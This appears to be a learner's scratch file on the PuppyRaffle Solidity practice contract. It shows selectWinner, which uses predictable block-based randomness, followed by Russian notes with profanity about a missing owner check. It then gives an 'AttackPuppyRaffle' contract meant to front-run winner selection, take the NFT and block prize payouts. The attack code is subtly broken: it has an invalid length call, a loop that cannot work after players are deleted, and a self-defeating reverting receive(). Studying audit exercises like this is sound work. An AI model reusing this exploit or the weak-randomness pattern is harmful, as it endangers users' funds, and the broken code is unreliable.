function selectWinner() external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
        uint256 winnerIndex =
            uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
        address winner = players[winnerIndex];
        uint256 totalAmountCollected = players.length * entranceFee;
        uint256 prizePool = (totalAmountCollected * 80) / 100;
        uint256 fee = (totalAmountCollected * 20) / 100;
        totalFees = totalFees + uint64(fee);

        uint256 tokenId = totalSupply();

        // We use a different RNG calculate from the winnerIndex to determine rarity
        uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
        if (rarity <= COMMON_RARITY) {
            tokenIdToRarity[tokenId] = COMMON_RARITY;
        } else if (rarity <= COMMON_RARITY + RARE_RARITY) {
            tokenIdToRarity[tokenId] = RARE_RARITY;
        } else {
            tokenIdToRarity[tokenId] = LEGENDARY_RARITY;
        }

        delete players;
        raffleStartTime = block.timestamp;
        previousWinner = winner;
        (bool success,) = winner.call{value: prizePool}("");
        require(success, "PuppyRaffle: Failed to send prize pool to winner");
        _safeMint(winner, tokenId);
    }



так смотри тут так же сук нету проверки на овнера еще         previousWinner = winner;

тобиж он тут выбирает победителя без проблем без проверок так как 
require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length >= 4, "PuppyRaffle: Need at least 4 players");

тут проверяют ток количество игроков и время окончания игры















contract AttackPuppyRaffle {
    PuppyRaffle public target;
    
    constructor(address _target) {
        target = PuppyRaffle(_target);
    }
    
    // Функция для фронт-рана
    function frontRunWinner() public {
        // Ждем когда можно выбрать победителя
        require(block.timestamp >= target.raffleStartTime() + target.raffleDuration());
        require(target.players.length() >= 4);
        
        // Смотрим кто в массиве игроков
        address[] memory players = target.getPlayers();
        
        // Перебираем вызовы с разными msg.sender
        for(uint i = 0; i < players.length; i++) {
            // Пытаемся стать победителем
            target.selectWinner();
        }
    }
    
    // Если выиграли - забираем NFT
    function stealNFT(uint256 tokenId) public {
        target.transferFrom(address(target), msg.sender, tokenId);
    }
    
    // Блокируем вывод призов
    receive() external payable {
        revert("HAHA! No prize for you!");
    }
}